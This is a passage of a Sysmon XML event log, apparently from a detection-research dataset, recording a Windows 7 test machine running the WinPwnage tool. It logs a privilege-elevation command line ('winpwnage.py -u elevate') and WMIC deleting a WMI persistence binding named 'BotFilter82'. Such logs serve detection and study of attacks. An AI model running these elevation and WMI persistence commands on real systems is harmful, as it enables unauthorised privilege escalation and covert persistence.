      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="EventType">WmiBindingEvent</Data>
      <Data Name="UtcTime">2019-05-11 17:58:55.090</Data>
      <Data Name="Operation">Deleted</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="Consumer"> "CommandLineEventConsumer.Name=\"BotConsumer23\""</Data>
      <Data Name="Filter"> "__EventFilter.Name=\"BotFilter82\""</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-11T17:58:55.153159600Z" />
      <EventRecordID>16124</EventRecordID>
      <Correlation />
      <Execution ProcessID="2032" ThreadID="2020" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-11 17:58:54.996</Data>
      <Data Name="ProcessGuid">{365ABB72-0D5E-5CD7-0000-001047331700}</Data>
      <Data Name="ProcessId">3016</Data>
      <Data Name="Image">C:\Windows\System32\wbem\WMIC.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">WMI Commandline Utility</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="BotFilter82"' DELETE</Data>
      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-0807-5CD7-0000-002091450100}</Data>
      <Data Name="LogonId">0x14591</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443</Data>
      <Data Name="ParentProcessGuid">{365ABB72-0D3E-5CD7-0000-0010680E1600}</Data>
      <Data Name="ParentProcessId">1832</Data>
      <Data Name="ParentImage">C:\Python27\python.exe</Data>
      <Data Name="ParentCommandLine">python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe</Data>
    </EventData>
  </Event>
</root>